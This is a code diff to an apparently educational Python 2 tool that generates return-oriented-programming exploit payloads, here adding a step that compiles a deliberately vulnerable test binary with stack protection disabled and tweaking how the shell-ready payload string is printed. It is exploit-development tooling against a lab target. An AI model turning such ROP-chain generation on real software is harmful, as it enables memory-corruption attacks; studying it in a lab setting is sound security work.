@@ -9,7 +9,7 @@ import io
 
 register_list = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"]
 #krishnan machine
-#buf_address = 0xbfffeda8
+#buf_address = 0xbffff138
 
 #neeraj machine
 buf_address = 0xbffff158 
@@ -818,7 +818,7 @@ def print_rop_payload(buf):
     while i < len(bufstr) - 1:
         exploit_str += "\\x" + bufstr[i] + bufstr[i+1]
         i += 2
-    print "`python -c \'print \"" + exploit_str + "\"\'`"
+    print "\"`python -c \'print \"" + exploit_str + "\"\'`\""
     print ""
     print "#"*int(columns)
 
@@ -876,11 +876,23 @@ def find_library_base_addr(vuln_binary, library_path):
         library_base_addr = int(proc.stdout.read(), 16)
     except Exception as e:
         print "Error finding library base address %s" %(str(e))
-        return None
+        return 0
 
     os.remove("./test.gdb")
     return library_base_addr
 
+def compile_binary(libraries):
+    rm_command = "rm -rf ./mprotect-shellcode/vuln2"
+    rmproc = subprocess.Popen(rm_command, shell=True, stdout=subprocess.PIPE)
+    rmproc.wait()
+    compile_command = "gcc -g -fno-stack-protector -mpreferred-stack-boundary=2 -o mprotect-shellcode/vuln2"
+    linker_flags = ""
+    for lib in libraries:
+        lib_path = os.path.realpath(lib)
+        linker_flags += " -L" + os.path.dirname(lib_path) + " -l:" + os.path.basename(lib_path)
+    compile_command += linker_flags + " mprotect-shellcode/vuln2.c"
+    proc = subprocess.Popen(compile_command, shell=True, stdout=subprocess.PIPE)
+    proc.wait()
 
 #------------main program changes-----------------
 if __name__ == '__main__':
@@ -894,6 +906,9 @@ if __name__ == '__main__':
     
     lib_list = []
     libraries = args.lib.split(' ')
+
+    compile_binary(libraries)
+
     for entry in libraries:
         disas_map = get_binary_instr(entry, args.p)
         if disas_map == None:
@@ -901,7 +916,7 @@ if __name__ == '__main__':
             exit(1)
 
         base_addr = find_library_base_addr(vuln_bin, entry)
-        if base_addr == None:
+        if base_addr == 0:
             print 'Unable to get base address for library %s' %(entry)
             exit(1)
         lib_list.append((disas_map, base_addr, entry))
@@ -909,3 +924,4 @@ if __name__ == '__main__':
     #build_rop_chain_libc_syscalls(lib_list)
     #build_rop_chain_libc(lib_list)
     build_rop_chain_syscall_generic(lib_list)
+
